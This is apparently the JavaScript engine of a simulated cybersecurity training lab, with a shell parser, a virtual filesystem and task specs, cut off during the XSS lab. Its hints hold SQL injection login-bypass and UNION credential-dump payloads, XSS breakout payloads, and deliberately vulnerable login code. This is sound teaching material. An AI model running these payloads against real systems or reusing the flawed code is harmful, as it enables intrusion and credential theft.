/**
 * ============================================================================
 * ENDLESSUS CYBERSECURITY ACADEMY — HIGH-FIDELITY LAB EXECUTION ENGINE (v5.0)
 * ============================================================================
 * Architecture:
 *   1. LabCommandParser: POSIX Shell Tokenizer, AST Builder, Pipeline & Redirect Parser
 *   2. LabVirtualFS: Stateful In-Memory POSIX Virtual Filesystem (Modes, UID/GID, VFS Tree)
 *   3. LAB_SPECIFICATIONS: Declarative Specifications for all 12 Practical Labs
 *   4. LAB_FLAGS: Authoritative Flag Tokens & Verification Aliases
 *   5. LabSessionManager: Client/Server Session Persistence & State Management
 *   6. ToolExecutors: Realistic Deterministic Simulators for Linux & Security Tools:
 *      - Network & Probing: nmap, nc/netcat, smbclient, curl, sqlmap
 *      - System & POSIX: ls, cat, chmod, stat, find, grep, head, tail, base64, cd,
 *                        whoami, id, pwd, echo, file, which, uname, date
 *      - Interpreters: python3 / python (expressions & solver scripts)
 *   7. LabValidatorEngine: Multi-Stage Pipeline Execution, Stateful Objective
 *      Validation & Flag Verification Engine
 * ============================================================================
 */

(function (root, factory) {
  if (typeof module === 'object' && module.exports) {
    // Node.js Server Environment
    module.exports = factory();
  } else {
    // Browser / Client-Side Environment
    root.LabEngine = factory();
  }
})(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  // =========================================================================
  // 1. COMMAND TOKENIZER & PARSER
  // =========================================================================
  class LabCommandParser {
    /**
     * Splits a raw shell string into tokens, respecting single and double quotes,
     * escape characters, pipelines, redirects, and command chaining.
     */
    static tokenize(input) {
      const tokens = [];
      let current = '';
      let inSingleQuote = false;
      let inDoubleQuote = false;
      let escaped = false;

      for (let i = 0; i < input.length; i++) {
        const char = input[i];

        if (escaped) {
          current += char;
          escaped = false;
          continue;
        }

        if (char === '\\') {
          escaped = true;
          continue;
        }

        if (char === "'" && !inDoubleQuote) {
          inSingleQuote = !inSingleQuote;
          continue;
        }

        if (char === '"' && !inSingleQuote) {
          inDoubleQuote = !inDoubleQuote;
          continue;
        }

        if (!inSingleQuote && !inDoubleQuote) {
          if (/\s/.test(char)) {
            if (current.length > 0) {
              tokens.push(current);
              current = '';
            }
            continue;
          }

          // Special Shell Operators
          if (char === '|' || char === ';' || char === '&' || char === '>') {
            if (current.length > 0) {
              tokens.push(current);
              current = '';
            }

            const nextChar = input[i + 1];
            if ((char === '&' && nextChar === '&') || (char === '|' && nextChar === '|') || (char === '>' && nextChar === '>')) {
              tokens.push(char + nextChar);
              i++;
            } else {
              tokens.push(char);
            }
            continue;
          }

          // Check stderr redirect 2>/dev/null
          if (char === '2' && input.slice(i, i + 12) === '2>/dev/null') {
            if (current.length > 0) {
              tokens.push(current);
              current = '';
            }
            tokens.push('2>/dev/null');
            i += 11;
            continue;
          }
        }

        current += char;
      }

      if (current.length > 0) {
        tokens.push(current);
      }

      return tokens;
    }

    /**
     * Parses tokens into command nodes grouped into pipeline stages and chain links.
     */
    static parse(cmdLine) {
      const raw = (cmdLine || '').trim();
      if (!raw) return null;

      const tokens = this.tokenize(raw);
      if (tokens.length === 0) return null;

      const commands = [];
      let currentCmd = {
        executable: '',
        args: [],
        options: {},
        flags: new Set(),
        positionals: [],
        redirects: {},
        pipeToNext: false,
        chainType: null,
        raw: ''
      };

      let i = 0;
      while (i < tokens.length) {
        const token = tokens[i];

        if (token === '|') {
          currentCmd.pipeToNext = true;
          commands.push(currentCmd);
          currentCmd = {
            executable: '',
            args: [],
            options: {},
            flags: new Set(),
            positionals: [],
            redirects: {},
            pipeToNext: false,
            chainType: null,
            raw: ''
          };
          i++;
          continue;
        }

        if (token === '&&' || token === ';') {
          currentCmd.chainType = token;
          commands.push(currentCmd);
          currentCmd = {
            executable: '',
            args: [],
            options: {},
            flags: new Set(),
            positionals: [],
            redirects: {},
            pipeToNext: false,
            chainType: null,
            raw: ''
          };
          i++;
          continue;
        }

        if (token === '>' || token === '>>' || token === '2>/dev/null') {
          if (token === '2>/dev/null') {
            currentCmd.redirects.stderr = '/dev/null';
          } else {
            const target = tokens[i + 1] || '/dev/null';
            currentCmd.redirects.stdout = target;
            currentCmd.redirects.append = (token === '>>');
            i++;
          }
          i++;
          continue;
        }

        if (!currentCmd.executable) {
          currentCmd.executable = token;
        } else {
          currentCmd.args.push(token);

          // Long options e.g. --dump, --head, --url=http...
          if (token.startsWith('--')) {
            const eqIdx = token.indexOf('=');
            if (eqIdx > -1) {
              const optName = token.slice(2, eqIdx);
              const optVal = token.slice(eqIdx + 1);
              currentCmd.options[optName] = optVal;
            } else {
              const optName = token.slice(2);
              currentCmd.options[optName] = true;
              currentCmd.flags.add(optName);
            }
          }
          // Short flags and clusters e.g. -sV, -sS, -la, -X POST, -d data
          else if (token.startsWith('-') && token.length > 1) {
            const flagStr = token.slice(1);

            // Options that take following argument:
            // -X <method>, -d <data>, -p <port>, -c <command>, -u <url>, -H <header>, -m <mode>, -L <share>
            // Note: -n takes argument for head and tail only! For echo, -n is a flag.
            const takesArg = ['X', 'd', 'p', 'c', 'u', 'H', 'm', 'L'].includes(flagStr) ||
                             (flagStr === 'n' && (currentCmd.executable === 'head' || currentCmd.executable === 'tail'));

            if (takesArg && tokens[i + 1] && !tokens[i + 1].startsWith('-')) {
              currentCmd.options[flagStr] = tokens[i + 1];
              currentCmd.flags.add(flagStr);
              i++;
            } else if (flagStr.startsWith('p') && flagStr.length > 1 && !flagStr.startsWith('perm')) {
              // Direct port flag cluster e.g. -p21, -p445
              currentCmd.options['p'] = flagStr.slice(1);
              currentCmd.flags.add('p');
            } else {
              currentCmd.flags.add(flagStr);

              // Only deconstruct single-letter clusters like -la, -al, -rf, -vn
              // Do NOT deconstruct composite flags like -sV, -sS, -sC, -T4, -Pn
              if (!flagStr.startsWith('s') && !flagStr.startsWith('T') && !flagStr.startsWith('P') && flagStr.length > 1) {
                for (const ch of flagStr) {
                  currentCmd.flags.add(ch);
                }
              }
            }
          } else {
            currentCmd.positionals.push(token);
          }
        }
        i++;
      }

      if (currentCmd.executable) {
        commands.push(currentCmd);
      }

      return {
        raw,
        commands
      };
    }
  }

  // =========================================================================
  // 2. VIRTUAL POSIX FILESYSTEM (VFS)
  // =========================================================================
  class LabVirtualFS {
    constructor(initialTree = {}) {
      this.tree = JSON.parse(JSON.stringify(initialTree || {}));

      // Ensure standard root filesystem structure exists
      const standardDirs = ['/', '/bin', '/usr', '/usr/bin', '/etc', '/var', '/var/log', '/var/www', '/home', '/tmp', '/root'];
      for (const d of standardDirs) {
        if (!this.tree[d]) {
          this.tree[d] = {
            type: 'dir',
            mode: d === '/root' ? 0o700 : 0o755,
            owner: 'root',
            group: 'root'
          };
        }
      }
    }

    normalizePath(base, targetPath) {
      if (!targetPath) return base;
      let p = targetPath.startsWith('/') ? targetPath : ((base.endsWith('/') ? base : base + '/') + targetPath);
      const parts = p.split('/').filter(Boolean);
      const stack = [];
      for (const part of parts) {
        if (part === '.') continue;
        if (part === '..') {
          if (stack.length > 0) stack.pop();
        } else {
          stack.push(part);
        }
      }
      return '/' + stack.join('/');
    }

    getNode(absPath) {
      return this.tree[absPath] || null;
    }

    checkPermission(node, user, euid, reqMode = 4) { // 4=read, 2=write, 1=execute
      if (euid === 0 || user === 'root') return true; // Root user holds full bypass
      if (!node) return false;

      const mode = node.mode;
      const ownerBits = (mode >> 6) & 7;
      const groupBits = (mode >> 3) & 7;
      const otherBits = mode & 7;

      if (user === node.owner) {
        return (ownerBits & reqMode) === reqMode;
      }
      if (node.group && (user === node.group || user === 'www-data' || user === 'adm')) {
        return (groupBits & reqMode) === reqMode;
      }
      return (otherBits & reqMode) === reqMode;
    }

    readFile(absPath, user, euid) {
      const node = this.getNode(absPath);
      if (!node) {
        return { error: `cat: ${absPath}: No such file or directory` };
      }
      if (node.type === 'dir') {
        return { error: `cat: ${absPath}: Is a directory` };
      }
      if (!this.checkPermission(node, user, euid, 4)) {
        return { error: `cat: ${absPath}: Permission denied` };
      }
      return { content: node.content || '' };
    }

    writeFile(absPath, content, user, euid, append = false) {
      const node = this.getNode(absPath);
      if (node) {
        if (!this.checkPermission(node, user, euid, 2)) {
          return { error: `bash: ${absPath}: Permission denied` };
        }
        node.content = append ? ((node.content || '') + '\n' + content) : content;
        node.mtime = Date.now();
        return { success: true };
      }

      // Create new file node in VFS
      this.tree[absPath] = {
        type: 'file',
        mode: 0o644,
        owner: user,
        group: user,
        content: content,
        mtime: Date.now()
      };
      return { success: true };
    }

    chmod(absPath, modeStr, user, euid) {
      const node = this.getNode(absPath);
      if (!node) {
        return { error: `chmod: cannot access '${absPath}': No such file or directory` };
      }

      // POSIX enforcement: changing file modes requires ownership or root EUID
      if (euid !== 0 && user !== 'root' && user !== node.owner) {
        return { error: `chmod: changing permissions of '${absPath}': Operation not permitted` };
      }

      // Numeric octal mode: e.g. 600, 640, 755, 777, 0600, 04755
      if (/^[0-7]{3,4}$/.test(modeStr)) {
        const parsed = parseInt(modeStr, 8);
        node.mode = parsed;
        return { success: true, mode: parsed };
      }

      // Standard symbolic modes
      if (modeStr === 'u=rw,go=' || modeStr === 'go-rwx') {
        node.mode = 0o600;
        return { success: true, mode: 0o600 };
      }
      if (modeStr === 'u=rw,g=r,o=' || modeStr === 'o-rwx') {
        node.mode = 0o640;
        return { success: true, mode: 0o640 };
      }
      if (modeStr === '+x') {
        node.mode = node.mode | 0o111;
        return { success: true, mode: node.mode };
      }
      if (modeStr === '-w') {
        node.mode = node.mode & ~0o222;
        return { success: true, mode: node.mode };
      }

      return { error: `chmod: invalid mode: '${modeStr}'` };
    }

    stat(absPath) {
      const node = this.getNode(absPath);
      if (!node) return null;
      return {
        path: absPath,
        type: node.type,
        mode: node.mode,
        octal: (node.mode & 0o7777).toString(8).padStart(4, '0'),
        shortOctal: (node.mode & 0o777).toString(8).padStart(3, '0'),
        owner: node.owner,
        group: node.group,
        size: node.content ? node.content.length : 4096,
        isSUID: Boolean(node.mode & 0o4000)
      };
    }

    listDirectory(absPath) {
      const files = [];
      const prefix = absPath.endsWith('/') ? absPath : absPath + '/';

      for (const [key, val] of Object.entries(this.tree)) {
        if (key === absPath) continue;
        if (key.startsWith(prefix)) {
          const rest = key.slice(prefix.length);
          if (!rest.includes('/')) {
            files.push({
              name: rest,
              fullPath: key,
              ...val
            });
          }
        }
      }
      return files;
    }
  }

  // =========================================================================
  // 3. COMPLETE DECLARATIVE LAB SPECIFICATIONS (ALL 12 LABS)
  // =========================================================================
  const LAB_SPECIFICATIONS = {
    // -----------------------------------------------------------------------
    // LAB 01: HTTP Security Headers Hardening
    // -----------------------------------------------------------------------
    'lab-headers': {
      id: 'lab-headers',
      num: '01',
      title: 'HTTP Security Headers Hardening',
      targetHost: 'staging.acmefin.local',
      targetPort: '443 (HTTPS)',
      targetUrl: 'https://staging.acmefin.local',
      initialUser: 'analyst',
      initialDir: '/home/analyst',
      allowedTools: ['curl', 'cat', 'ls', 'grep', 'whoami', 'id', 'pwd', 'echo', 'clear', 'help'],
      initialFiles: {
        '/home/analyst/audit_notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'analyst',
          group: 'analyst',
          content: 'Audit Target: https://staging.acmefin.local\nTask: Verify missing browser protections (HSTS, CSP, X-Frame-Options, HttpOnly cookies).\nInspect server response headers using curl -I.'
        },
        '/home/analyst/response.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'analyst',
          group: 'analyst',
          content: 'HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\nSet-Cookie: session_id=abc12345; Path=/\nContent-Type: text/html; charset=UTF-8\n\n<!DOCTYPE html><html><body><h1>AcmeFintech Staging</h1></body></html>'
        },
        '/etc/nginx/conf.d/security.conf': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'root',
          content: `# Hardened Nginx Production Directive Block
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none';" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
server_tokens off;

# Compliance Verification Flag: flag{strict_transport_security_csp}`
        }
      },
      tasks: [
        {
          id: 'inspect-headers',
          title: 'Inspect the Web Server Response Headers',
          validate: (cmd, ast) => {
            if (ast.executable === 'curl') {
              const hasHead = ast.flags.has('I') || ast.flags.has('head') || ast.flags.has('i');
              const hasTarget = cmd.includes('staging.acmefin.local') || cmd.includes('localhost') || cmd.includes('127.0.0.1');
              return hasHead && hasTarget;
            }
            return false;
          },
          syntaxHint: "Use 'curl -I https://staging.acmefin.local' to query headers only.",
          successNote: "HTTP response headers retrieved. Observe information leakage in Server & X-Powered-By headers."
        },
        {
          id: 'identify-hsts',
          title: 'Identify Missing Transport Security (HSTS)',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            const checksHsts = lower.includes('strict') || lower.includes('hsts') || lower.includes('transport-security');
            const queriesServer = (ast.executable === 'curl' || cmd.includes('curl')) && (lower.includes('staging.acmefin.local') || lower.includes('localhost'));
            return checksHsts && queriesServer;
          },
          syntaxHint: "Filter response headers for transport security: 'curl -I https://staging.acmefin.local | grep -i strict'",
          successNote: "Verified absence of Strict-Transport-Security header: connection is vulnerable to SSL stripping."
        },
        {
          id: 'detect-framing',
          title: 'Detect Missing Framing Controls (Clickjacking)',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            const checksFrame = lower.includes('frame') || lower.includes('clickjack') || lower.includes('x-frame');
            const queriesServer = (ast.executable === 'curl' || cmd.includes('curl')) && (lower.includes('staging.acmefin.local') || lower.includes('localhost'));
            return checksFrame && queriesServer;
          },
          syntaxHint: "Check for clickjacking controls: 'curl -I https://staging.acmefin.local | grep -i frame'",
          successNote: "Absence of X-Frame-Options or frame-ancestors confirmed: site can be framed by malicious origins."
        },
        {
          id: 'audit-cookies',
          title: 'Audit Sensitive Session Cookie Flags',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            const checksCookie = lower.includes('cookie') || lower.includes('httponly') || lower.includes('samesite');
            const queriesServer = (ast.executable === 'curl' || cmd.includes('curl')) && (lower.includes('staging.acmefin.local') || lower.includes('localhost'));
            return checksCookie && queriesServer;
          },
          syntaxHint: "Audit cookies: 'curl -I https://staging.acmefin.local | grep -i set-cookie'",
          successNote: "Session cookie lacks HttpOnly, Secure, and SameSite attributes."
        },
        {
          id: 'review-config',
          title: 'Retrieve Compliance Flag & Review Hardened Config',
          validate: (cmd, ast) => {
            return ast.executable === 'cat' && cmd.includes('security.conf');
          },
          syntaxHint: "Inspect hardened configuration template using 'cat /etc/nginx/conf.d/security.conf'.",
          successNote: "Hardened Nginx block verified. Flag token retrieved: flag{strict_transport_security_csp}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 02: Linux Permissions & Octal Masking
    // -----------------------------------------------------------------------
    'lab-permissions': {
      id: 'lab-permissions',
      num: '02',
      title: 'Linux Permissions & Octal Masking',
      targetHost: 'app-server-01.local',
      targetPort: 'Local Filesystem (/var/www/html)',
      initialUser: 'admin',
      initialDir: '/var/www/html',
      allowedTools: ['ls', 'stat', 'chmod', 'cat', 'whoami', 'id', 'pwd', 'echo', 'clear', 'help'],
      initialFiles: {
        '/var/www/html/config.php': {
          type: 'file',
          mode: 0o777, // Dangerously world-writable
          owner: 'admin',
          group: 'admin',
          content: `<?php
// AcmeFintech Database Configuration
// CRITICAL AUDIT NOTE: File was set to world-writable mode (777)!
$db_host = "localhost";
$db_user = "db_admin";
$db_pass = "P@ssw0rd2026!";
$db_name = "acme_production";
// Security Audit Flag: flag{chmod_600_config_rw}
?>`
        },
        '/var/www/html/index.php': {
          type: 'file',
          mode: 0o644,
          owner: 'admin',
          group: 'admin',
          content: '<?php echo "<h1>Production API Gateway</h1>"; ?>'
        },
        '/var/www/html/db.sql': {
          type: 'file',
          mode: 0o644,
          owner: 'admin',
          group: 'admin',
          content: '-- Schema backup for acme_production\nCREATE TABLE users (id INT, username VARCHAR(50));'
        }
      },
      tasks: [
        {
          id: 'audit-dir-permissions',
          title: 'Audit File Permissions in Current Directory',
          validate: (cmd, ast) => {
            return ast.executable === 'ls' && (ast.flags.has('l') || ast.flags.has('la') || ast.flags.has('al') || ast.flags.has('lh'));
          },
          syntaxHint: "Run 'ls -la' to inspect full permission bits across all directory contents.",
          successNote: "File permissions enumerated in long list format."
        },
        {
          id: 'identify-world-writable',
          title: 'Identify the World-Writable File',
          validate: (cmd, ast) => {
            return (ast.executable === 'ls' || ast.executable === 'stat') && cmd.includes('config.php') && !cmd.includes('chmod');
          },
          syntaxHint: "Inspect config.php specifically: 'ls -la config.php' or 'stat config.php'.",
          successNote: "Identified config.php carrying unsafe 777 (rwxrwxrwx) permissions."
        },
        {
          id: 'read-credentials',
          title: 'Inspect Database Credentials in config.php',
          validate: (cmd, ast) => {
            return ast.executable === 'cat' && cmd.includes('config.php');
          },
          syntaxHint: "Read file contents with 'cat config.php'.",
          successNote: "Database credentials and audit flag extracted from unhardened file."
        },
        {
          id: 'apply-chmod',
          title: 'Apply Principle of Least Privilege with chmod',
          validate: (cmd, ast, out, session) => {
            if (ast.executable !== 'chmod') return false;
            const stat = session.fs.stat('/var/www/html/config.php');
            return stat && (stat.shortOctal === '600' || stat.shortOctal === '640');
          },
          syntaxHint: "Enforce least privilege using 'chmod 600 config.php'.",
          successNote: "Permissions restricted to 0600 (-rw-------). Least privilege enforced!"
        },
        {
          id: 'verify-permissions',
          title: 'Verify Permissions and Retrieve Flag',
          validate: (cmd, ast, out, session) => {
            const stat = session.fs.stat('/var/www/html/config.php');
            const isHardened = stat && (stat.shortOctal === '600' || stat.shortOctal === '640');
            const verifies = ast.executable === 'stat' && cmd.includes('config.php');
            return isHardened && verifies;
          },
          syntaxHint: "Verify hardened permissions: 'stat -c \"%a %n\" config.php'.",
          successNote: "Hardened mode 600 verified. Audit flag confirmed: flag{chmod_600_config_rw}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 03: Authentication & Rate Limiting Bypass
    // -----------------------------------------------------------------------
    'lab-auth': {
      id: 'lab-auth',
      num: '03',
      title: 'Authentication & Rate Limiting Bypass',
      targetHost: 'auth.corp-portal.local',
      targetPort: '8443 (HTTPS) / 10.10.10.45',
      targetUrl: 'https://auth.corp-portal.local:8443',
      initialUser: 'tester',
      initialDir: '/home/tester',
      allowedTools: ['cat', 'curl', 'ls', 'whoami', 'pwd', 'grep', 'clear', 'help'],
      initialFiles: {
        '/app/server.js': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: `const express = require('express');
const app = express();
app.use(express.json());

// VULNERABLE: Direct string concatenation in SQL authentication query!
// Missing: express-rate-limit middleware and parameterized queries.
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  db.get(query, (err, row) => {
    if (row) {
      res.json({ status: "success", authenticated: true, user: row.username, role: row.role, token: "flag{rate_limit_429_bcrypt}" });
    } else {
      res.status(401).json({ status: "failed", message: "Invalid credentials" });
    }
  });
});`
        },
        '/home/tester/server.js': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: `// Local symlink reference to /app/server.js
const express = require('express');
const app = express();
app.use(express.json());

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  // VULNERABLE: SQL string concatenation without rate limiting
});`
        }
      },
      tasks: [
        {
          id: 'read-auth-source',
          title: 'Review Authentication Backend Source Code',
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('server.js'),
          syntaxHint: "Inspect server code with 'cat /app/server.js' or 'cat server.js'.",
          successNote: "Analyzed login route handler: identified unsanitized SQL string interpolation."
        },
        {
          id: 'identify-sqli-flaw',
          title: 'Identify the SQL Injection Flaw in the Login Query',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            return (cmd.includes('grep') || cmd.includes('cat')) && (lower.includes('select') || lower.includes('query'));
          },
          syntaxHint: "Filter query line: 'cat /app/server.js | grep -i select'",
          successNote: "Isolated raw query: single quote (') terminates string literal; '--' comments out password check."
        },
        {
          id: 'send-bypass-request',
          title: 'Send the Authentication Bypass Request',
          validate: (cmd, ast) => {
            if (ast.executable !== 'curl') return false;
            const hasLogin = cmd.includes('/login');
            const payload = String(ast.options.d || ast.options.data || cmd);
            const hasSqli = (payload.includes("admin'") || payload.includes("admin\\'") || payload.includes("admin%27")) &&
                            (payload.includes('--') || payload.includes('#') || payload.toLowerCase().includes('or'));
            const isPost = ast.options.X === 'POST' || ast.options.d || ast.options.data || cmd.includes('-d') || cmd.includes('--data');
            return hasLogin && hasSqli && Boolean(isPost);
          },
          syntaxHint: "Send bypass: curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":\"admin\\'--\",\"password\":\"x\"}' http://10.10.10.45/login",
          successNote: "Authentication bypassed! Server returned admin session token."
        },
        {
          id: 'audit-rate-limiting',
          title: 'Understand Rate Limiting and HTTP 429',
          validate: (cmd, ast) => {
            if (ast.executable !== 'curl') return false;
            const hasHead = ast.flags.has('I') || ast.flags.has('head') || cmd.includes('-I');
            const hasLogin = cmd.includes('/login');
            return hasHead && hasLogin;
          },
          syntaxHint: "Check endpoint headers: 'curl -I http://10.10.10.45/login'",
          successNote: "Absence of HTTP 429 Retry-After and rate limiting headers confirmed."
        },
        {
          id: 'submit-auth-flag',
          title: 'Submit the Auth Bypass Flag',
          validate: (cmd, ast, out, session) => {
            return session.completedTasks.has(2) && (cmd.includes('flag{rate_limit_429_bcrypt}') || cmd.includes('rate_limit_429_bcrypt'));
          },
          syntaxHint: "Submit flag token: flag{rate_limit_429_bcrypt}",
          successNote: "Flag token verified: flag{rate_limit_429_bcrypt}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 04: Insecure Direct Object Reference (IDOR)
    // -----------------------------------------------------------------------
    'lab-idor': {
      id: 'lab-idor',
      num: '04',
      title: 'Insecure Direct Object Reference (IDOR)',
      targetHost: 'billing.internal.local',
      targetPort: '3000 (HTTP / JSON API)',
      targetUrl: 'http://billing.internal.local/api/v1/invoices',
      initialUser: 'auditor',
      initialDir: '/home/auditor',
      allowedTools: ['curl', 'cat', 'ls', 'whoami', 'pwd', 'grep', 'clear', 'help'],
      initialFiles: {
        '/home/auditor/api_docs.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'auditor',
          group: 'auditor',
          content: `Endpoint Documentation:
GET /api/v1/invoices/:invoice_id
Header: Authorization: Bearer eyJhbGciOi... (Auditor User ID: 410)
Your assigned Invoice ID: 9482
Goal: Verify whether the API enforces horizontal access control scoping.`
        }
      },
      tasks: [
        {
          id: 'fetch-assigned-invoice',
          title: 'Fetch Your Assigned Invoice via API',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.includes('9482');
          },
          syntaxHint: "Fetch own invoice: 'curl http://billing.internal.local/api/v1/invoices/9482'",
          successNote: "Own invoice retrieved: ID 9482, Customer 'Learner Account', $120.00."
        },
        {
          id: 'tamper-adjacent-invoice',
          title: 'Test Parameter Tampering on Adjacent Invoices',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && (cmd.includes('9481') || cmd.includes('9480'));
          },
          syntaxHint: "Test adjacent ID: 'curl http://billing.internal.local/api/v1/invoices/9481'",
          successNote: "IDOR vulnerability confirmed: accessed invoice 9481 belonging to Acme Corp without authorization."
        },
        {
          id: 'enumerate-executive-invoice',
          title: 'Enumerate the Confidential Acquisition Invoice',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.includes('10043');
          },
          syntaxHint: "Query executive invoice: 'curl http://billing.internal.local/api/v1/invoices/10043'",
          successNote: "Confidential executive M&A invoice 10043 exposed ($5,000,000.00)."
        },
        {
          id: 'extract-authz-flag',
          title: 'Extract the Authorization Flag',
          validate: (cmd, ast, out, session) => {
            return (session.completedTasks.has(2) && cmd.includes('flag')) || (ast.executable === 'curl' && cmd.includes('10043') && (cmd.includes('grep') || cmd.includes('flag')));
          },
          syntaxHint: "Extract flag token: 'curl http://billing.internal.local/api/v1/invoices/10043 | grep flag'",
          successNote: "Authorization flag retrieved: flag{server_side_authz_session_token}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 05: UNION-Based SQL Injection
    // -----------------------------------------------------------------------
    'lab-sqli': {
      id: 'lab-sqli',
      num: '05',
      title: 'UNION-Based SQL Injection',
      targetHost: 'shop.local',
      targetPort: '80 (HTTP)',
      targetUrl: 'http://shop.local/search?item=',
      initialUser: 'tester',
      initialDir: '/home/tester',
      allowedTools: ['curl', 'sqlmap', 'cat', 'ls', 'whoami', 'pwd', 'grep', 'clear', 'help'],
      initialFiles: {
        '/home/tester/notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: 'Target URL: http://shop.local/search?item=shirt\nTest parameter for SQL injection vulnerabilities using single quotes and UNION SELECT.'
        }
      },
      tasks: [
        {
          id: 'probe-single-quote',
          title: 'Probe for SQL Injection with a Single Quote',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            return ast.executable === 'curl' && (cmd.includes("'") || cmd.includes("%27")) && !lower.includes('order') && !lower.includes('union');
          },
          syntaxHint: "Trigger syntax error: curl \"http://shop.local/search?item=shirt'\"",
          successNote: "Database syntax error triggered: backend confirmed vulnerable to SQL injection."
        },
        {
          id: 'order-by-columns',
          title: 'Determine Column Count with ORDER BY',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            return ast.executable === 'curl' && lower.includes('order') && lower.includes('by');
          },
          syntaxHint: "Determine columns: curl \"http://shop.local/search?item=' ORDER BY 4-- -\"",
          successNote: "Column count determined: query returns exactly 4 columns."
        },
        {
          id: 'union-db-version',
          title: 'Extract Database Version via UNION SELECT',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            const isCurl = ast.executable === 'curl' && lower.includes('union') && lower.includes('select') && (lower.includes('version') || lower.includes('sqlite_version'));
            const isSqlmap = ast.executable === 'sqlmap' && (cmd.includes('-u') || cmd.includes('--url'));
            return isCurl || isSqlmap;
          },
          syntaxHint: "Extract version: curl \"http://shop.local/search?item=' UNION SELECT 1,sqlite_version(),3,4-- -\"",
          successNote: "Database version projected into DOM response."
        },
        {
          id: 'dump-admin-credentials',
          title: 'Dump Administrator Credentials from Users Table',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            const isCurl = ast.executable === 'curl' && lower.includes('union') && lower.includes('select') && lower.includes('users');
            const isSqlmap = ast.executable === 'sqlmap' && cmd.includes('--dump');
            return isCurl || isSqlmap;
          },
          syntaxHint: "Dump credentials: curl \"http://shop.local/search?item=' UNION SELECT 1,username,password_hash,4 FROM users-- -\"",
          successNote: "Users table dumped: admin credentials and bcrypt hash recovered."
        },
        {
          id: 'submit-sqli-flag',
          title: 'Submit the Remediation Flag',
          validate: (cmd, ast, out, session) => {
            const lower = cmd.toLowerCase();
            return session.completedTasks.has(3) && (cmd.includes('flag{parameterized_queries_prepared_statement}') || lower.includes('flags'));
          },
          syntaxHint: "Submit flag token: flag{parameterized_queries_prepared_statement}",
          successNote: "SQLi defense flag verified: flag{parameterized_queries_prepared_statement}."
        }
      ]
    },

    // -----------------------------------------------------------------------
    // LAB 06: Reflected XSS & Context Escaping
    // -----------------------------------------------------------------------
    'lab-xss': {
      id: 'lab-xss',
      num: '06',
      title: 'Reflected XSS & Context Escaping',
      targetHost: 'portal.local',
      targetPort: '80 (HTTP)',
      targetUrl: 'http://portal.local/search?q=',
      initialUser: 'researcher',
      initialDir: '/home/researcher',
      allowedTools: ['curl', 'cat', 'ls', 'whoami', 'pwd', 'grep', 'clear', 'help'],
      initialFiles: {
        '/home/researcher/target_source.html': {
          type: 'file',
          mode: 0o644,
          owner: 'researcher',
          group: 'researcher',
          content: `<!-- Search Page DOM Snippet -->
<form action="/search" method="GET">
  <input type="text" name="q" value="[USER_INPUT_HERE]" />
  <button type="submit">Search</button>
</form>`
        }
      },
      tasks: [
        {
          id: 'probe-reflection',
          title: 'Probe for Unescaped Reflection',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && (cmd.includes('search') || cmd.includes('q=')) && (cmd.includes('<') || cmd.includes('probe') || cmd.includes('test<'));
          },
          syntaxHint: "Send probe: curl \"http://portal.local/search?q=test<probe>\"",
          successNote: "Input reflected verbatim inside HTML response without entity encoding."
        },
        {
          id: 'identify-context',
          title: 'Identify the HTML Injection Context',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            return (cmd.includes('grep') && lower.includes('input')) || (ast.executable === 'cat' && cmd.includes('target_source.html'));
          },
          syntaxHint: "Inspect parent tag: 'curl \"http://portal.local/search?q=mysearch\" | grep -i input'",
          successNote: "Identified reflection inside HTML attribute: <input name=\"q\" value=\"...\">."
        },
        {
          id: 'breakout-attribute',
          title: 'Break Out of the Attribute Using Double Quotes',
          validate: (cmd, ast) => {
            if (ast.executable !== 'curl') return false;
            const url = (ast.positionals && ast.positionals.find(p => p.includes('search') || p.includes('q='))) || '';
            const lowerUrl = url.toLowerCase();
            const hasBreakout = url.includes('"') || lowerUrl.includes('%22') || lowerUrl.includes('autofocus');
            const hasFullPayload = lowerUrl.includes('alert') || lowerUrl.includes('document.domain');
            return hasBreakout && !hasFullPayload;
          },
          syntaxHint: "Break out with quotes: curl \"http://portal.local/search?q=test\\\"+autofocus+onfocus=\\\"alert(1)\\\"\"",
          successNote: "Double quote broke out of value attribute, allowing definition of new HTML attributes."
        },
        {
          id: 'inject-event-handler',
          title: 'Inject Event Handler and Retrieve Flag',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
